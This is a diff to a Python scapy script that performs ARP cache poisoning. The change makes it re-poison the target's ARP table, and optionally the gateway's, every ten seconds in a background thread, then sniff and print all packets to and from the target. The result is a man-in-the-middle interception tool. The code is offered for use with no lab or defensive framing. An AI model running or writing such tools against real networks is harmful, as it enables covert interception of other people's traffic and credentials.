@@ -5,11 +5,12 @@ from scapy.all import Ether , ARP,conf, get_if_addr , get_if_hwaddr,srp1,sendp,s
 from time import sleep
 import arpUtil
 import subprocess
-
+import threading
+import time
 rep = False 
 options = {
-        "interface" :conf.iface,#which interface should it use
-        "delay" : 3 , #delayed or not
+        "interface" :conf.iface,
+        "delay" : 3 , #delayed or
         "attackGW" : None , #full or half duplex 
         "target" : "127.0.0.1",#attack target 
         "src": None , #attack source
@@ -34,7 +35,12 @@ def main(argv :list )->None:
         -t TARGET, --target TARGET
                             IP of target
     '''
-
+    def redoit(source):
+        while(True):
+            arpUtil.changeArpTable(options["target"], source  ,options["mac"], options["interface"] )
+            if(options["attackGW"]):
+                arpUtil.changeArpTable(options["router"] ,options["target"] , options["mac"],options["interface"] )
+            time.sleep(10)
     try:
         opts, args = getopt.getopt(argv, "s:t:d:i:gw:h", [
                                     "src=","delay=","target=","iface=","gateway","help"])
@@ -66,14 +72,13 @@ def main(argv :list )->None:
     
     source = options["src"] if options["src"] else options["router"]
     print(source)
-    arpUtil.changeArpTable(options["target"], source  ,options["mac"], options["interface"] )
-    if(options["attackGW"]):
-        arpUtil.changeArpTable(options["router"] ,options["target"] , options["mac"],options["interface"] )
-        sniff(
-            lfilter= lambda x : IP in x and (x[IP].dst != options["ip"] or x[IP].src != options["ip"]) 
-            , prn = lambda x : x.show() 
+    tr = threading.Thread(target=redoit , args=(source,))
+    tr.start()
+    sniff(
+        lfilter= lambda x : IP in x and (x[IP].dst == options["target"] or x[IP].src == options["target"] ) , prn = lambda x : x.show() 
         
-        ) #MITM if there is 
+    )
+    tr.join()
 if __name__ == "__main__":
     
     batcmd="sysctl net.ipv4.ip_forward"
